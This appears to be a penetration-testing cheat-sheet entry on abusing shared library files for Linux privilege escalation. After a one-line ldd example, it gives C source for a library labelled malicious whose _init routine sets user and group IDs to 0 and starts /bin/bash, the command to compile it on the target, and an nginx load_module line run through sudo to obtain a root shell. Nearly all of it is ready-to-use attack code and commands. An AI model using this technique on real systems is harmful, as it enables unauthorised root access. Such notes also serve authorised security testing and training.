# Shared Library Files

Shared library utilities:

```bash
# Print shared objects required by a binary or shared object
ldd /bin/ls
```

Create a malicious shared library

shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

We compile it on the target

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
```

Examples:

```bash
# nginx (add the following line to a copied nginx.conf file in /tmp/nginx.conf)
load_module /tmp/shell.so;
# then run the following command
sudo nginx -c /tmp/nginx.conf
```
